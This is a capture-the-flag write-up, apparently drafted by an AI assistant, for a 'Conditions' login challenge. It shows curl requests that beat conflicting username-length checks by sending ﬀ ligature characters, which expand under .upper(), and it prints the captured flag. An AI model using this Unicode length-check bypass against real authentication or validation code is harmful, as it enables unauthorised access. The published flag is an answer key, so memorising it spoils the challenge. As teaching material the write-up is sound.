Here’s your unique Markdown write-up based on your approach. Let me know if you need any refinements! 🚀  

---

# Conditions - CTF Write-up  

## 🏆 Challenge Overview  

**Category:** Misc (100 points)  
**Author:** theinit01  
**Description:**  
We are presented with a seemingly **impossible-to-pass** login system that enforces conflicting conditions:  

1. If the username length is **40 or more**, it is "too long."  
2. If the **uppercase version** of the username is **50 or fewer**, it is "too short."  

The goal is to **bypass these conditions** and retrieve the flag.  

🔗 **Challenge Link:** [Conditions CTF](https://conditions.ctf.dscjssstuniv.in)  

---

## 🕵️‍♂️ Approach  

### 🔍 Step 1: Understanding the Conditions  

The first step was analyzing how the server checks username length. From testing different inputs via `curl`, I identified the key issue:  

```python
if len(username) >= 40:
    return "Username is too long!"
elif len(username.upper()) <= 50:
    return "Username is too short!"
else:
    return flag
```

To **pass the check**, we needed a username that:  

✔ **Has fewer than 40 characters initially**  
✔ **Expands beyond 50 characters after `.upper()` is applied**  

---

### 🔑 Step 2: Finding a Suitable Payload  

The trick was using a **Unicode character** that changes length when capitalized. I tested several inputs:  

```bash
curl -X POST 'https://conditions.ctf.dscjssstuniv.in/login' -d 'username=ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß'
```
💥 **Result:** "Username is too long!"  

```bash
curl -X POST 'https://conditions.ctf.dscjssstuniv.in/login' -d 'username=iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
```
💥 **Result:** "Username is too long!"  

```bash
curl -X POST 'https://conditions.ctf.dscjssstuniv.in/login' -d 'username=A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀A⠀'
```
💥 **Result:** "Username is too short!"  

After several trials, I found that using `ﬀ` (Ligature `ff`) **expands in uppercase**, allowing the condition to be bypassed.  

```bash
curl -X POST 'https://conditions.ctf.dscjssstuniv.in/login' -d 'username=ﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀﬀ'
```

🎉 **Success! The flag was returned!**  

---

## 🏆 Final Flag  

```
dscctf{1mp0551bl3_c0nd1710n5_0r_p0551bl3_c0nd1710n5}
```

---

## 🔥 Key Takeaways  

- **Unicode quirks** can be leveraged to **bypass length-based restrictions**.  
- **Ligatures (e.g., `ﬀ`) behave differently when uppercased**, making them useful in certain exploits.  
- Always inspect **string transformations** (`upper()`, `lower()`, etc.) when analyzing input validation mechanisms.  

🔍 **Lesson:** Never assume length checks are secure—Unicode can be unpredictable! 🚀